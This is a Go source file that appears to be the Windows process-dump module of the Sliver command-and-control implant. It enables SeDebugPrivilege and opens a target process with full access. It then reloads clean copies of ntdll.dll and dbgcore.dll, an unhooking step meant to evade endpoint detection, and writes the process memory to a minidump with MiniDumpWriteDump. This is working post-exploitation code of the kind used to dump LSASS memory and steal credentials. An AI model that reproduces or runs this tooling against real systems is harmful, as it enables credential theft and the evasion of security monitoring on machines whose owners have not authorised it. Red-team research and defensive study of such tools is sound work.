package procdump

import (
	"fmt"
	"io/ioutil"
	"os"
	"sliver/sliver/taskrunner"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

type WindowsDump struct {
	data []byte
}

func (d *WindowsDump) Data() []byte {
	return d.data
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// Most of the following code comes from
// https://github.com/C-Sto/Jaqen/blob/master/libJaqen/agent/HandySnippets/unhook/unhook.go
func dumpProcess(pid int32) (ProcessDump, error) {
	res := &WindowsDump{}
	if success := setPrivilege("SeDebugPrivilege", true); !success {
		return res, fmt.Errorf("Could not set SeDebugPrivilege on", pid)
	}

	hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return res, err
	}
	if hProc != 0 {
		taskrunner.RefreshPE(`c:\windows\system32\ntdll.dll`)
		taskrunner.RefreshPE(`c:\windows\system32\dbgcore.dll`)
		return minidump(int(pid), int(hProc))
	}
	return res, fmt.Errorf("Could not dump process memory")
}

func setPrivilege(s string, b bool) bool {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		panic(err)
	}
	syscall.OpenProcessToken(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, _ := procLookupPriv.Call(
		ptr(0),                         //LPCWSTR lpSystemName,
		ptr(s),                         //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)), //PLUID   lpLuid
	)
	if r == 0 {
		return false
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	r, _, _ = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		ptr(0),
		ptr(0),
		ptr(0),
	)
	return r != 0
}

func minidump(pid, proc int) (ProcessDump, error) {
	dump := &WindowsDump{}
	k32 := syscall.NewLazyDLL("Dbgcore.dll")
	minidumpWriteDump := k32.NewProc("MiniDumpWriteDump")
	// TODO: find a better place to store the dump file
	f, err := ioutil.TempFile("", "")

	if err != nil {
		return dump, err
	}
	stdOutHandle := f.Fd()
	r, _, _ := minidumpWriteDump.Call(ptr(proc), ptr(pid), stdOutHandle, 3, 0, 0, 0)
	if r != 0 {
		data, err := ioutil.ReadFile(f.Name())
		dump.data = data
		if err != nil {
			return dump, err
		}
		os.Remove(f.Name())
	}
	return dump, nil
}
